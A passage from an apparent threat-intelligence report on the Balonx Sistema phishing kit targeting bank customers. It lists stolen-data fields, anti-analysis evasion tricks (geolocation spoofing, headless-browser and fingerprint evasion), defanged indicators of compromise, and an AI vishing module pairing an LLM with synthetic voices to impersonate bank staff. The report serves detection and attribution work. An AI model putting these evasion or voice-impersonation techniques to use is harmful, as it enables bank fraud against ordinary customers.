style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SIP/VoIP configuration</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">site_config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Configurable C2 domain</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">system_config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Global subscription price</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">payments</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Subscription payments (Bitso + Telegram receipt)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">discount_codes</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Discount codes for new affiliates</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">bank_screen_flows</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Screen flows per bank (global)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">user_bank_flows</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Screen flows per bank and per user</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">link_tokens</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Generated links with Bitly shortening support</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">link_usage_weekly</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Weekly link quota per user</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">office_profiles</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Office account profiles</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">whatsapp_config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">WhatsApp bot configuration</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">whatsapp_menu_options</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">WhatsApp bot menu</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">whatsapp_conversations</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">WhatsApp conversation history</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">verification_codes</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Panel access OTP codes</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">notifications</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Internal system notifications</td></tr></tbody></table></figure><h3><strong>9.3 sessions Table — Full Field List (Stolen Victim Data)</strong></h3><p>Each victim session stores:</p><p>sessionId, folio, username, password, banco, tarjeta, fechaVencimiento, cvv,</p><p>sms, nip, smsCompra, celular, pasoActual, qrData, qrImageData,</p><p>codigoRetiro, pinRetiro, saldoDebito, montoDebito, saldoCredito, montoCredito,</p><p>latitude, longitude, googleMapsLink, ipAddress, locationTimestamp,</p><p>deviceType, deviceModel, deviceBrowser, deviceOs, userAgent,</p><p>documentType, documentFileName, documentFileUrl,</p><p>selfieFileName, selfieFileUrl, identityVerified,</p><p>fileName, fileUrl, fileSize,</p><p>flowConfig, currentStepIndex, flowState,</p><p>officeId, executiveId, createdBy, saved, active, deletedByUser</p><h2><strong>10. Victim Geolocation System</strong></h2><p>The kit captures and stores:</p><ul><li><strong>GPS coordinates</strong> (latitude and longitude) of the victim's device</li><li><strong>Direct Google Maps link</strong> with the exact location, automatically generated</li><li><strong>IP address</strong> obtained via&nbsp;api[.]ipify[.]org</li><li><strong>Timestamp</strong> of when the location was obtained</li></ul><h2><strong>11. Link Generation and Management</strong></h2><ul><li>Generated links support&nbsp;<strong>Bitly shortening</strong> (bitlyLinkId,&nbsp;shortUrl fields in&nbsp;link_tokens table)</li><li>Each link has an expiration time and can be&nbsp;<strong>extended in 30-minute blocks</strong> from the panel</li><li>The&nbsp;link_usage_weekly table implements a&nbsp;<strong>weekly link quota per user</strong>, presumably as a service control mechanism</li><li>The endpoint&nbsp;/api/generate-link?banco={BANK} generates a unique link per bank on each call</li></ul><p>&nbsp;</p><h2>&nbsp;</h2><h2><strong>12. Evasion and Anti-Analysis Techniques</strong></h2><ul><li><strong>Geolocation Spoofing:</strong> Overwrites&nbsp;navigator.geolocation to always return CDMX coordinates (19.4326, -99.1332), deceiving geographic anti-fraud systems.</li><li><strong>Headless Browser Evasion:</strong> Removes traces of Selenium, PhantomJS, and Nightmare from the browser environment.</li><li><strong>Canvas/WebGL Poisoning:</strong> Adds random noise to&nbsp;toDataURL and&nbsp;getImageData to alter browser fingerprinting.</li><li><strong>Human Behavior Detection (behaviorScore):</strong> Evaluates typing speed, mouse movement, and clicks. Threshold: 50 points. If the session does not appear human, access is blocked.</li><li><strong>WebRTC Spoofing:</strong> Injects fake STUN/TURN servers to hide the real C2 server IP.</li><li><strong>hCaptcha:</strong> Implemented as an anti-bot filter. The bundle uses the Vite test key (VITE_HCAPTCHA_SITE_KEY) instead of a production key — this may facilitate bypass in analysis environments.</li><li><strong>Device limit:</strong> Each operator account has a maximum of 2 registered devices (maxDevices). When exceeded, the user is redirected to&nbsp;/balonx to confuse investigators.</li></ul><h2><strong>13. Indicators of Compromise (IoCs) — Complete Table</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Type</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Value</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 domain</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">aclaracionesditales[.]com</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Malicious APK</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">BankProtect.apk /&nbsp;Bankprotet2_1750982122281.apk</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram Sales</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@BalonxSistema</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram Bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@panelbalonxbot</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram direct link</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">https://t[.]me/BalonxSistema</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SuperAdmin usernames</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">balonx,&nbsp;brandon</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS provider</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">api[.]sofmex[.]mx</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VoIP provider</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">central[.]voipleaders[.]net</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VoIP WebSocket</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">wss://central[.]voipleaders[.]net:8089/ws</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">WebSocket C2 path</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/ws</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Key endpoint</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/generate-link?banco=</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Exfiltration endpoint</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/upload-identity-files</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">localStorage keys</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">authToken,&nbsp;2fa_verification_token</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">IP geolocation API</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://api[.]ipify[.]org?format=json</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">QR generation API</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://api[.]qrserver[.]com/v1/create-qr-code/</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Anti-bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://js[.]hcaptcha[.]com/1/api.js</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Payment processor</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Bitso API</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Link shortener</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Bitly API</td></tr></tbody></table></figure><p>&nbsp;</p><h2><strong>14. Analyzed Source Files</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>File</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Size</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">index-m6IlfyGV.js</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">1.3 MB (997 minified lines)</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Compiled frontend of admin panel — complete Vite/React bundle. Analyzed 2026-04-15</td></tr></tbody></table></figure><p>&nbsp;</p><p>&nbsp;</p><h2>&nbsp;</h2><h2><strong>15. Images:</strong></h2><p><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76_IMAGE__\" width=\"624\" /></p><p style=\"text-align:center;\"><i>Access to the executive dashboard. /balonx Path.</i></p><p>&nbsp;</p><p><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a_IMAGE__\" width=\"624\" /></p><p style=\"text-align:center;\"><i>Prices of an Office Plan. Up to 8 Executives.</i></p><p>&nbsp;</p><p><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12_IMAGE__\" width=\"609\" /></p><p style=\"text-align:center;\"><i>Registration of an Individual Account. /balonx Path.</i></p><p>&nbsp;</p><p><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8_IMAGE__\" width=\"608\" /></p><p style=\"text-align:center;\"><i>Login page. /balonx Path.</i></p><h2><strong>16. Bot Interaction:</strong></h2><p><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/d52e1bba84deff069895fd7d531d27580c59ac6d783e6ea9dcae9a497b601fb7?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:d52e1bba84deff069895fd7d531d27580c59ac6d783e6ea9dcae9a497b601fb7_IMAGE__\" width=\"652\" /></p><p style=\"text-align:center;\"><i>/start command for the registration process. @PanelBalonxBot</i></p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/1d94cfb6a519c9d5ad893c5e41021f68c1645344b876e3851276368d799ce942?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:1d94cfb6a519c9d5ad893c5e41021f68c1645344b876e3851276368d799ce942_IMAGE__\" width=\"330\" /></p><p style=\"text-align:center;\"><i>Chat ID necessary for registration. @PanelBalonxBot</i></p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/43ad5f702b4ec8461dcf0e3206d2ef943dbd9cc702104e080bd24257aab8e90f?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:43ad5f702b4ec8461dcf0e3206d2ef943dbd9cc702104e080bd24257aab8e90f_IMAGE__\" width=\"409\" /></p><p style=\"text-align:center;\"><i>User @BalonxSistema ‘Jay’. Possible threat actor.</i></p><p style=\"text-align:center;\">&nbsp;</p><p><i><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9_IMAGE__\" width=\"624\" /></i></p><p style=\"text-align:center;\"><i>C2 IP collected from Bankprotec malware APK.</i></p><p>&nbsp;</p><p style=\"text-align:center;\"><i><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc_IMAGE__\" width=\"624\" /></i></p><p style=\"text-align:center;\"><i>Establishing connection with the C2 server.</i></p><p style=\"text-align:center;\">&nbsp;</p><h1><strong>17. AI Vishing Module</strong></h1><p>&nbsp;</p><p><strong>Analysis Date:&nbsp;</strong>2026-05-26</p><p>&nbsp;</p><p><strong>Analyzed Files:</strong></p><ul><li><strong>index-FreePBX-Balonx.html</strong> (241 KB) — FreePBX UCP login page.</li><li><strong>index-CallBalonx.js</strong> (1.2 MB) — AI Call Center panel frontend.</li></ul><p><strong>Key Finding:&nbsp;</strong>Balonx Sistema has evolved from the classic PhaaS model (web phishing + APK) to a second independent and parallel service: an automated vishing Call Center with generative AI (synthetic voice + conversational LLM + Whisper for ASR). This module DOES NOT replace the previous infrastructure — it coexists with it and is offered as a separate product to kit affiliates.</p><h2>&nbsp;</h2><h2><strong>VAIaaS Service Summary (Vishing-AI-as-a-Service)</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Attribute</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Detail</strong></p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Internal Name (probable)</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>panelbalonxfs (fs = FreePBX Server)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Type</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Automated Vishing with synthetic voice + real-time LLM</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Underlying PBX</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">FreePBX v17[.]0[.]4[.]31 / 17.0.28 (Sangoma Technologies)</td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Operation Model</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Mass outbound calls with conversational bots impersonating bank executives</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Panel Roles</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>admin, manager, executive (identical to the main PhaaS)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Technical Capacity</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>30 simultaneous SIP channels by default, multi-trunk, multi-campaign</p><p>&nbsp;</p></td></tr></tbody></table></figure><h2>&nbsp;</h2><h2>&nbsp;</h2><h2>&nbsp;</h2><h2>&nbsp;</h2><h2><strong>New C2 Infrastructure (Independent of aclaracionesditales[.]com)</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Tipo</strong></p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Valor</strong></p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Función</strong></p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>C2 Domain (new)</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>panelbalonxfs[.]xyz</p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>AI Call Center Backend</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Endpoint GraphQL</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">https://panelbalonxfs[.]xyz/admin/api/api/gql</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Main API (GraphQL)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Endpoint REST</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">https://panelbalonxfs[.]xyz/admin/api/api/rest</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Parallel REST API</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Endpoint Token</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">https://panelbalonxfs[.]xyz/admin/api/api/token</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Authentication token issuance</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>SIP Server IP</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">85[.]31[.]235[.]109</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Proprietary SIP Server (not VoIP Leaders)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>SIP Port</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">5160/TCP</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Hardcoded; internal note: \"el puerto 5060 no está disponible\" (suggests upstream blocking due to prior abuse)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Default Codecs</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">ulaw,alaw</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Standard telephony audio</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>PBX Software</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">FreePBX v17[.]0[.]4[.]31 / 17.0.28</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">Producto de Sangoma Technologies abusado</td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Captured CSRF Token (UCP)</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\">dba4aab2b193b488e4c0d99d52428dfe</td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Login form session</p><p>&nbsp;</p></td></tr></tbody></table></figure><p><strong>Key Implication:&nbsp;</strong>This is the first time the group has operated its own SIP private branch exchange (PBX) instead of abusing a legitimate provider (central[.]voipleaders[.]net). This suggests operational maturity and/or that VoIP Leaders has already detected and blocked them.</p><h2>&nbsp;</h2><h2><strong>Identified Generative AI Stack</strong></h2><p>The bundle exposes multiple integrations with commercial AI providers — the \"bank executive\" calling the victim is no longer human; it is an LLM speaking with a synthetic voice.</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Componente</strong></p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Proveedor / Modelo</strong></p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Función</strong></p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Conversational LLM</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>GPT-4o-mini (OpenAI)</p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Generates dialogue in real-time during the call</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Primary Text-to-Speech (TTS)</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>ElevenLabs</p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>High-quality synthetic voice (named voices: carolina)</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Secondary TTS</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>OpenAI Voice (voz echo)</p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Fallback / alternative</p><p>&nbsp;</p></td></tr><tr><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p><strong>Automatic Speech Recognition (ASR)</strong></p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>OpenAI Whisper</p><p>&nbsp;</p></td><td style=\"border-color:#808080;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p>Transcribes what the victim says in real-time</p><p>&nbsp;</p></td></tr></tbody></table></figure><p><strong>Critical Attribution Vector:&nbsp;</strong>The /api/dashboard/ai-costs imply an active paid account with OpenAI and ElevenLabs. Both providers apply KYC to the payment method — this is the best vector for attributing the group to a real identity.</p><h2>&nbsp;</h2><h2><strong>Call Center Backend Endpoints</strong></h2><p><strong>Authentication</strong></p><p>&nbsp;</p><p>POST /api/auth/admin/login — Panel admin login</p><p>POST /api/auth/executive/login — Executive login</p><p>&nbsp;</p><p><strong>Calls and Orchestration</strong></p><p>&nbsp;</p><p>GET&nbsp;/api/active-calls</p><p>GET&nbsp;/api/calls</p><p>POST /api/calls/flow-test</p><p>POST /api/external/trigger-call — Call triggering from external system</p><p>&nbsp;</p><h2><strong>Confirmed Operational Capabilities</strong></h2><ul><li><strong>Real-time voice generation:</strong> ElevenLabs/OpenAI TTS with custom voices.</li><li><strong>LLM Conversation:</strong> GPT-4o-mini generates contextualized responses.</li><li><strong>Live Espionage (spy-call):</strong> Managers can listen covertly to active calls (Asterisk ChanSpy).</li></ul><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/8278cc2573c9a533e7396456864551f2bf05e70ad0d65f1802c7ae05e8b698eb?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:8278cc2573c9a533e7396456864551f2bf05e70ad0d65f1802c7ae05e8b698eb_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:8278cc2573c9a533e7396456864551f2bf05e70ad0d65f1802c7ae05e8b698eb_IMAGE__\" /></p><p style=\"text-align:center;\"><i>Landing authentication panel - callbalonx[.]info</i><br><br>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/f0ba1d886b5de588fe9a5faa2182d296cd032c3b6ebc5dbc5cf046212c472b37?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:f0ba1d886b5de588fe9a5faa2182d296cd032c3b6ebc5dbc5cf046212c472b37_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:f0ba1d886b5de588fe9a5faa2182d296cd032c3b6ebc5dbc5cf046212c472b37_IMAGE__\" /></p><p style=\"text-align:center;\"><i>FreePBX service connected to callbalonx[.]info - balonxpanelfs[.]xyz</i></p><p style=\"text-align:center;\">&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/6c9836e2f1abb78b4b49d07f25ba042539426233/file/dea9511288c302a5ddd454a55552690964f0287aa43c04b5cb0fdbff11b6d276?placeholder=__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:dea9511288c302a5ddd454a55552690964f0287aa43c04b5cb0fdbff11b6d276_IMAGE__\" width=\"624\" 